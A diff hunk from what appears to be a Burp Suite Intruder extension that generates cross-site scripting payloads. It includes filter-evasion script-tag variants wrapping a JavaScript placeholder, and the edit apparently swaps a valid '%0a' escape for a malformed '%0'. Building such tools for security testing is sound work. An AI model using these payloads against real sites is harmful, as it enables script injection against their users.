@@ -164,9 +164,9 @@ IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor {
             ("<STYLE TYPE=\"text/javascript\">"
                 + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</STYLE>")
                 .getBytes(),
-            ("<scr%0aipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0aipt>")
+            ("<scr%0ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0ipt>")
                 .getBytes(),
-            ("<scr%0aipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0aipt>")
+            ("<scr%0ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0ipt>")
                 .getBytes(),
             ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>")
                 .getBytes(),
